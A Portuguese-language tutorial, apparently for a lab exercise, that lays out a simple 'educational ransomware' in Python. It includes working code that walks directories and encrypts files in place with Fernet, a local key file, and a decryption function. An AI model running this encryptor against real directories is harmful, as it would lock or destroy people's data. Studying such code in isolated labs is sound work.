Plano de implementação para resolver o desafio ransomware com python.

A. Ambiente de Desenvolvimento
Sistema Operacional: Use sua máquina virtual Kali Linux.
Ferramentas: Instale Python 3 e bibliotecas relevantes, como cryptography.
Ambiente Controlado: Certifique-se de trabalhar em um ambiente isolado e com arquivos que você possa manipular e apagar sem consequências.

B. Estrutura do Projeto
O ransomware terá as seguintes partes:

Localização de Arquivos: Localiza os arquivos no sistema para criptografar.
- Criptografia: Usa algoritmos para proteger os arquivos.
- Geração de Chaves: Cria e armazena uma chave para descriptografar os arquivos.
- Nota de Resgate: Mostra uma mensagem simulando um ataque.
- Descriptografia: Um módulo opcional para reverter o processo.

C. Configuração do Ambiente - Kali Linux:

1 - Instalar o Python e as bibliotecas necessárias:

sudo apt update
sudo apt install python3 python3-pip
pip3 install cryptography

2 - Crie um diretório para o projeto:

mkdir ransomware_project
cd ransomware_project

3. Código Base
Aqui está uma base para o ransomware educacional:

- Localizar Arquivos
Use o módulo os para percorrer os diretórios e identificar arquivos:

import os

def encontrar_arquivos(diretorio_alvo, extensoes):
    arquivos_encontrados = []
    for root, _, files in os.walk(diretorio_alvo):
        for file in files:
            if file.split('.')[-1] in extensoes:
                arquivos_encontrados.append(os.path.join(root, file))
    return arquivos_encontrados

- Criptografar Arquivos
Utilize a biblioteca cryptography para criptografar com AES:

from cryptography.fernet import Fernet

def gerar_chave():
    chave = Fernet.generate_key()
    with open("chave.key", "wb") as chave_file:
        chave_file.write(chave)
    return chave

def carregar_chave():
    return open("chave.key", "rb").read()

def criptografar_arquivo(arquivo, chave):
    fernet = Fernet(chave)
    with open(arquivo, "rb") as file:
        dados = file.read()
    dados_encriptados = fernet.encrypt(dados)
    with open(arquivo, "wb") as file:
        file.write(dados_encriptados)

Main Script

def main():
    diretorio = "/path/to/directory"  # Alterar para o diretório alvo
    extensoes = ["txt", "jpg", "png", "pdf"]  # Alterar para as extensões desejadas

    print("[+] Gerando chave de criptografia...")
    chave = gerar_chave()

    print("[+] Localizando arquivos...")
    arquivos = encontrar_arquivos(diretorio, extensoes)

    print("[+] Criptografando arquivos...")
    for arquivo in arquivos:
        criptografar_arquivo(arquivo, chave)
        print(f"Arquivo criptografado: {arquivo}")

    print("[+] Criptografia concluída.")
    print("ATENÇÃO: Sua chave está salva no arquivo 'chave.key'. Não perca!")

5. Testando com Segurança
   
Diretório de Teste: Crie um diretório com arquivos de teste que você pode perder.
Execução: Execute o script apenas nesse diretório.
Descriptografar (opcional): Implemente a função para reverter a criptografia com a chave gerada.
Descriptografar Arquivo

def descriptografar_arquivo(arquivo, chave):
    fernet = Fernet(chave)
    with open(arquivo, "rb") as file:
        dados_encriptados = file.read()
    dados = fernet.decrypt(dados_encriptados)
    with open(arquivo, "wb") as file:
        file.write(dados)

6. Ética e Responsabilidade!
